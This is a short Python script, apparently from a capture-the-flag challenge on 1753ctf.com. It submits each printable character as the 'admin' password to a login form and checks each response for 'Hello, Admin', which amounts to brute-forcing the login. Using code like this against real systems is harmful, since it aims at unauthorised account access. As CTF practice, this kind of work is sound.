import requests
from string import printable

url = "https://entropyyyyyyyyyyyyyyyyyyyyyyyyyyyyyy-2f567adc1e4d.1753ctf.com/"


def submit(password):
    res = requests.post(url, data={"username": "admin", "password": password})
    return "Hello, Admin" in res.text


for x in printable:
    print(x, submit(x))
